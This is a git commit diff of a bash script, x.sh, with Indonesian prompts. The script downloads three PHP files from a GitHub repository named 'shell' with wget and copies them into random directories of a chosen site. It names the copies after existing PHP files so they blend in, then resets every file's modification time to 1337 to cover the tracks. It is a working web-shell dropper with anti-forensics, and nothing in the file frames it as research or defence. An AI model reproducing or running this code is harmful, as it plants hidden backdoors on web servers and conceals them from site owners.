0093051fea069faeda8614e73bac6708bf58e411
OxygenCall <165064752+oxygencall@users.noreply.github.com>
2024-04-01 15:16:15 +0700

    Update x.sh

--- x.sh
+++ x.sh
@@ -1,44 +1,37 @@
 #!/bin/bash
 
-show_available_directories() {
-    echo "Daftar directory yang tersedia:"
-    ls -d */
-}
-echo "Silahkan masukkan nama folder:"
+echo "Daftar directory yang tersedia:"
+ls -d */
+
+echo "Silahkan masukkan nama folder tujuan:"
 read varname
 echo "Directory yang di tuju: $varname"
-show_available_directories
-mkdir x
-file_urls=(
-    "https://raw.githubusercontent.com/oxygencall/shell/main/xf.php"
-    "https://raw.githubusercontent.com/oxygencall/shell/main/us.php"
-    "https://raw.githubusercontent.com/oxygencall/shell/main/hd.php"
-)
 
-for url in "${file_urls[@]}"; do
-    if command -v wget &>/dev/null; then
-        wget --no-verbose --no-check-certificate -qP x "$url"
-    elif command -v curl &>/dev/null; then
-        curl -sS "$url" -o "x/$(basename "$url")"
-    elif command -v lynx &>/dev/null; then
-        lynx -source "$url" > "x/$(basename "$url")"
-    elif command -v fetch &>/dev/null; then
-        fetch -o "x/$(basename "$url")" "$url"
+mkdir x
+
+wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/oxygencall/shell/main/xf.php
+wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/oxygencall/shell/main/us.php
+wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/oxygencall/shell/main/hd.php
+
+for i in $(ls -l x/ | awk '{print $9}' | sed '/^$/d'); do
+    myfile=$(find "$varname" -name "*.php" | rev | cut -d/ -f 1 | rev | shuf -n 1)
+    mydir=$(find "$varname" -type d | shuf -n 1)
+
+    if [ ! -f "$mydir/$myfile" ]; then
+        cp "x/$i" "$mydir/$myfile"
+        echo "$mydir/$myfile"
     else
-        echo "Tidak ada opsi untuk mendownload file. Silakan install wget, curl, lynx, atau fetch."
-        exit 1
+        xmyfile=$(find "$varname" -name "*.php" | rev | cut -d/ -f 1 | rev | shuf -n 1)
+        xmydir=$(find "$varname" -type d | shuf -n 1)
+
+        if [ ! -f "$xmydir/$xmyfile" ]; then
+            cp "x/$i" "$xmydir/$xmyfile"
+            echo "$xmydir/$xmyfile"
+            find . -exec touch -m -d '01/01/1337' {} +
+        fi
     fi
 done
 
-for file in x/*; do
-    random_folder=$(find "$varname" -type d | shuf -n 1)
-    cp "$file" "$random_folder/"
-    echo "File berhasil disalin ke: $random_folder/$(basename "$file")"
-done
-
-echo "Mengatur ulang tanggal modifikasi untuk semua file dan directory"
-find . -exec touch -m -d '01/01/1337' {} +
-
-rm -rf x x.sh
+rm -rf x
 
 echo "Selesai."
